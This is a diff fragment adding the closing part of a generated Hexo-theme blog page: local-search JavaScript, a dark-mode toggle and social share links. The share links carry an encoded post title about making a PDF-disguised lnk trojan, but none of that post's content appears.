+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%88%B6%E4%BD%9CPDF%20lnk%E9%A9%AC + '&url=' + http%3A%2F%2Fexample.com%2F2026%2F09%2F08%2F%25E5%2588%25B6%25E4%25BD%259CPDF-lnk%25E9%25A9%25AC%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2026/09/08/%E5%88%B6%E4%BD%9CPDF-lnk%E9%A9%AC/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
